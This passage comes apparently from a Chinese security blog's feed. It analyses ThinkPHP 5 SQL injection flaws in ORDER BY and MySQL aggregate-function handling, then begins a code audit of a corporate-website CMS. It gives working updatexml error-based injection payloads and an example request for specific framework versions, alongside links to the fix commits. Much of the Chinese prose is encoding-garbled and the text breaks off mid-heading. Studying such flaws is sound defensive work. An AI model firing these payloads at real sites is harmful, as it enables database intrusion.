class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨äº†<code>parseOrder</code> æ–¹æ³•ï¼Œè·Ÿè¿›ä¸‹ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span>(<span class="params">Query $query, $order</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;[rand]&#x27;</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">&#x27; &#x27;</span>, strpos($val, <span class="string">&#x27; &#x27;</span>) ? $val : $val . <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">&#x27;ASC&#x27;</span>, <span class="string">&#x27;DESC&#x27;</span>], <span class="literal">true</span>) ? <span class="string">&#x27; &#x27;</span> . $sort : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="literal">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; ORDER BY &#x27;</span> . implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„å‡½æ•°ä¸­ï¼Œ<code>$order</code> å³æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ï¼Œç„¶åç»è¿‡äº†<code>parseKey</code> æ–¹æ³•å¤„ç†åè¿”å›ç»™<code>$array</code>ã€‚</p><p>è·Ÿè¿›æŸ¥çœ‹è¯¥æ–¹æ³•çš„å®ç°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233128.png" alt="image-20200915231942203"></p><p>è¯¥æ–¹æ³•åœ¨å˜é‡<code>$key</code> çš„ä¸¤ç«¯æ·»åŠ äº†åå¼•å·è¿›è¡Œæ‹¼æ¥ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚å†å’Œç²¾å¿ƒæ„é€ å¥½çš„Payload ç»“åˆå</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233201.png" alt="image-20200915230823430"></p><p>æœ€ç»ˆè¿”å›äº†ä¸€ä¸ªå¸¦æœ‰<code>ORDER BY</code> çš„ SQL æ³¨å…¥ payload ç»™è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼Œå®ç°<code>ORDER BY</code> æ³¨å…¥ã€‚</p><h2 id="åˆ©ç”¨æ€»ç»“-4"><a href="#åˆ©ç”¨æ€»ç»“-4" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233944.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-4"><a href="#æ¼æ´ä¿®å¤-4" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190</a></p><h1 id="SQLæ³¨å…¥å…­-Mysqlèšåˆå‡½æ•°æ³¨å…¥"><a href="#SQLæ³¨å…¥å…­-Mysqlèšåˆå‡½æ•°æ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥å…­(Mysqlèšåˆå‡½æ•°æ³¨å…¥)"></a>SQLæ³¨å…¥å…­(Mysqlèšåˆå‡½æ•°æ³¨å…¥)</h1><h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>ä¸åŒç‰ˆæœ¬ <strong>payload</strong> éœ€ç¨ä½œè°ƒæ•´ï¼š</p><p><strong>5.0.0~5.0.21</strong> ã€ <strong>5.1.3ï½5.1.10</strong> ï¼š <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p><strong>5.1.11ï½5.1.25</strong> ï¼š <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p>è¿™é‡Œä»¥<code>5.1.25</code> ç‰ˆæœ¬çš„ThinkPHP è¿›è¡Œæ¼æ´åˆ†æã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?options&#x3D;id&#96;)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916003016.png" alt="image-20200916003000509"></p><h2 id="å½±å“ç‰ˆæœ¬-5"><a href="#å½±å“ç‰ˆæœ¬-5" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p> <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> ã€ <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> </p><h2 id="æ¼æ´æ¦‚è¿°-5"><a href="#æ¼æ´æ¦‚è¿°-5" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äºæ‰€æœ‰ <strong>Mysql</strong> èšåˆå‡½æ•°ç›¸å…³æ–¹æ³•ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-5"><a href="#æ¼æ´åˆ†æ-5" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å’Œä¹‹å‰çš„åˆ†ææ€è·¯ä¸€æ ·ï¼Œå…ˆå»Github ä¸Šæ‰¾æ›´æ–°ç‰ˆæœ¬çš„commit è®°å½•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916004546.png" alt="image-20200916003529194"></p><p><a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p><p>æ–°å¢åŠ äº†ä¸€æ¡<code>if</code> åˆ¤æ–­ è¯­å¥ï¼Œç”¨æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p><p>å’Œå‰å‡ ä¸ªThinkPHP 5 SQL æ³¨å…¥æ¼æ´ä¸€æ ·ï¼Œç¨‹åºéƒ½ä¼šè¿›å…¥åˆ°<code>Query</code> ç±»ä¸­ï¼Œæ­¤å¤„åœ¨<code>../application/index/controller/index.php</code> ä¸­ï¼Œæ¨¡æ‹Ÿçš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = request()-&gt;get(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;max($options);</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤ä¼šå…ˆè¿›å…¥åˆ°<code>Query</code>ç±» çš„ <code>max</code> æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014143.png" alt="image-20200916010724376"></p><p>ç”¨æˆ·çš„è¾“å…¥ä¼ ç»™äº†<code>field</code> ï¼šid`)+updatexml(1,concat(0x7,user(),0x7e),1) from users#</p><p>ç„¶åè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº†<code>aggregate</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥ç€è°ƒç”¨äº†<code>$this-&gt;connection</code> çš„ <code>aggregate</code>æ–¹æ³•ï¼Œè€Œ<code>$this-&gt;connection</code> ä¸º<code>think\db\connector\Mysql</code> ç±»ï¼Œè€Œ<code>Mysql</code>ç±»ç»§æ‰¿ä¸<code>Connection</code> ç±»ï¼Œæ•…è°ƒç”¨è¯¥ç±»çš„<code>aggregate</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº†<code>$this-&gt;builder</code>ï¼Œæ­¤å¤„ä¸º<code>think\db\Builder\Mysql</code> ç±»çš„ <code>parseKey</code> æ–¹æ³•ã€‚è¯¥æ–¹æ³•å’ŒSQLæ³¨å…¥äº”èµ·åˆ°çš„ä½œç”¨ä¸€æ ·ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014123.png" alt="image-20200916012332355"></p><p>ç†æ¸…äº†è°ƒç”¨æƒ…å†µã€‚å…·ä½“è¯´<code>parseKey</code>æ–¹æ³•çš„ä½œç”¨</p><blockquote><p><strong>parseKey</strong> æ–¹æ³•ä¸»è¦æ˜¯å¯¹å­—æ®µå’Œè¡¨åè¿›è¡Œå¤„ç†ï¼Œè¿™é‡Œåªæ˜¯å¯¹æˆ‘ä»¬çš„æ•°æ®ä¸¤ç«¯éƒ½æ·»åŠ äº†åå¼•å·ã€‚ç»è¿‡ <strong>parseKey</strong> æ–¹æ³•å¤„ç†åï¼Œç¨‹åºåˆå›åˆ°äº†ä¸Šå›¾çš„ <strong>$this-&gt;value()</strong> æ–¹æ³•ä¸­ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨ <strong>Builder</strong> ç±»çš„ <strong>select</strong> æ–¹æ³•æ¥æ„é€  <strong>SQL</strong> è¯­å¥ã€‚è¿™ä¸ªæ–¹æ³•åº”è¯¥è¯´æ˜¯åœ¨åˆ†æ <strong>ThinkPHP</strong> æ¼æ´æ—¶ï¼Œéå¸¸å¸¸è§çš„äº†ã€‚å…¶æ— éå°±æ˜¯ä½¿ç”¨ <strong>str_replace</strong> æ–¹æ³•ï¼Œå°†å˜é‡æ›¿æ¢åˆ° <strong>SQL</strong> è¯­å¥æ¨¡æ¿ä¸­ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ <strong>parseField</strong> æ–¹æ³•ï¼Œå› ä¸ºç”¨æˆ·å¯æ§æ•°æ®å­˜å‚¨åœ¨ <strong>$options[â€˜fieldâ€™]</strong> å˜é‡ä¸­å¹¶è¢«ä¼ å…¥è¯¥æ–¹æ³•ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>parseFieid</code>æ–¹æ³•ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseField</span>(<span class="params">Query $query, $fields</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == $fields || <span class="keyword">empty</span>($fields)) &#123;</span><br><span class="line">        $fieldsStr = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_array($fields)) &#123;</span><br><span class="line">        <span class="comment">// æ”¯æŒ &#x27;field1&#x27;=&gt;&#x27;field2&#x27; è¿™æ ·çš„å­—æ®µåˆ«åå®šä¹‰</span></span><br><span class="line">        $array = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($key)) &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key) . <span class="string">&#x27; AS &#x27;</span> . <span class="keyword">$this</span>-&gt;parseKey($query, $field, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $fieldsStr = implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $fieldsStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•æœªåšä»»ä½•è¿‡æ»¤ï¼Œç”¨æˆ·å¯æ§æ•°æ®åªæ˜¯ç»è¿‡ <strong>parseKey</strong> æ–¹æ³•å¤„ç†ï¼Œå¹¶ä¸å½±å“æ•°æ®ï¼Œç„¶åç›´æ¥ç”¨é€—å·æ‹¼æ¥ï¼Œæœ€ç»ˆç›´æ¥æ›¿æ¢è¿› <strong>SQL</strong> è¯­å¥æ¨¡æ¿é‡Œï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„å‘ç”Ÿ</p><h2 id="åˆ©ç”¨æ€»ç»“-5"><a href="#åˆ©ç”¨æ€»ç»“-5" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://github.com/Ifonly-go2019/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/7.png" alt="7"></p><h2 id="æ¼æ´ä¿®å¤-5"><a href="#æ¼æ´ä¿®å¤-5" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šå½“åŒ¹é…åˆ°é™¤äº† <strong>å­—æ¯ã€ç‚¹å·ã€æ˜Ÿå·</strong> ä»¥å¤–çš„å­—ç¬¦æ—¶ï¼Œå°±æŠ›å‡ºå¼‚å¸¸ã€‚</p><p> <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç¯å¢ƒå‡†å¤‡ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQLæ³¨å…¥" scheme="https://hack-for.fun/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>æ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»Ÿä»£ç å®¡è®¡å­¦ä¹ (å¤ç°)</title>
    <link href="https://hack-for.fun/844d1b07.html"/>
    <id>https://hack-for.fun/844d1b07.html</id>
    <published>2020-09-12T01:19:38.000Z</published>
    <updated>2020-09-12T10:49:37.659Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://v0w.top/2020/08/26/CodeAudit-php/">ä»£ç å®¡è®¡å¸¸è§çš„ä¸‰ç§æ–¹æ³•ï¼ˆPHPç¯‡ï¼‰</a></p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-1">PHPä»£ç å®¡è®¡åˆæ¬¡å°è¯•ä¹‹æ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»Ÿ</a></p><p>å®¡è®¡æ€è·¯é€šè¿‡è„‘å›¾å¤§æ¦‚æ€»ç»“å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912095326.png" alt="image-20200912095322738"></p><h1 id="äº†è§£ç³»ç»Ÿ"><a href="#äº†è§£ç³»ç»Ÿ" class="headerlink" title="äº†è§£ç³»ç»Ÿ"></a>äº†è§£ç³»ç»Ÿ</h1><p><strong>CMSåç§°</strong>ï¼šæ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»ŸPHPç‰ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183413.png" alt="image-20200912095625466"></p><p>çœ‹ç€ç•Œé¢å°±çŸ¥é“æ˜¯ç”¨äºä¼ä¸šæ‰“å¹¿å‘Š(x)å’Œå‘å¸ƒä¿¡æ¯ï¼Œæ‹›è˜ç­‰åŠŸèƒ½çš„ç³»ç»Ÿã€‚ä¸”å­˜åœ¨å‰å°ç”¨æˆ·ç™»å½•å’Œåå°ç®¡ç†ç³»ç»Ÿã€‚å­˜åœ¨æœç´¢åŠŸèƒ½ã€‚</p><h1 id="é˜²æŠ¤ç­–ç•¥"><a href="#é˜²æŠ¤ç­–ç•¥" class="headerlink" title="é˜²æŠ¤ç­–ç•¥"></a>é˜²æŠ¤ç­–ç•¥</h1><h2 id="IPç™»å½•é™åˆ¶-çŒœæµ‹ä¼ªé€ IPæ³¨å…¥"><a href="#IPç™»å½•é™åˆ¶-çŒœæµ‹ä¼ªé€ IPæ³¨å…¥" class="headerlink" title="IPç™»å½•é™åˆ¶ - çŒœæµ‹ä¼ªé€ IPæ³¨å…¥"></a>IPç™»å½•é™åˆ¶ - çŒœæµ‹ä¼ªé€ IPæ³¨å…¥</h2><p>é™åˆ¶äº†å‰å°ã€åå°çš„ç™»å½•æ¬¡æ•°é™åˆ¶ã€æ³¨å†Œé™åˆ¶ã€å¯èƒ½ä¼šå½±å“åˆ°åé¢SQLæ³¨å…¥æ¼æ´çš„æµ‹è¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183349.png" alt="image-20200912100248513"></p><p>å¯èƒ½å‡ºç°çš„æ¼æ´ï¼š<strong>ä¼ªé€ IPè¿›è¡Œæ³¨å…¥æ”»å‡»</strong></p><p>æ•°æ®åº“ç›‘æ§ï¼Œåœ¨æ³¨å†Œçš„åœ°æ–¹çœ‹çœ‹<code>ip</code> æ˜¯å¦è¢«å¸¦å…¥äº†æ•°æ®åº“ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184550.png" alt="image-20200912102325325"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from php_shisiusafe where saf_ip &#x3D; &#39;127.0.0.1&#39;  and saf_action &#x3D; &#39;register&#39;</span><br></pre></td></tr></table></figure><p>å…¨å±€å®šä½åˆ°è·å–ç”¨æˆ·iPçš„ä»£ç éƒ¨åˆ†ï¼š</p><p>phpstorm æœç´¢ è·å–IPï¼Œå³å¯ã€‚</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–å®¢æˆ·ç«¯IP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$ip)))</span><br><span class="line">&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œå½“ip é™¤å»<code>.</code>  åï¼Œå¦‚æœä¸æ˜¯çº¯æ•°å­—ï¼Œé‚£ä¹ˆå°±è®¾ç½®ä¸º 0.0.0.0 ã€‚å› æ­¤é€šè¿‡ä¼ªé€ IPè¿›è¡Œæ³¨å…¥æ˜¯è¡Œä¸é€šäº†ã€‚</p><h2 id="XSS-è¿‡æ»¤"><a href="#XSS-è¿‡æ»¤" class="headerlink" title="XSS 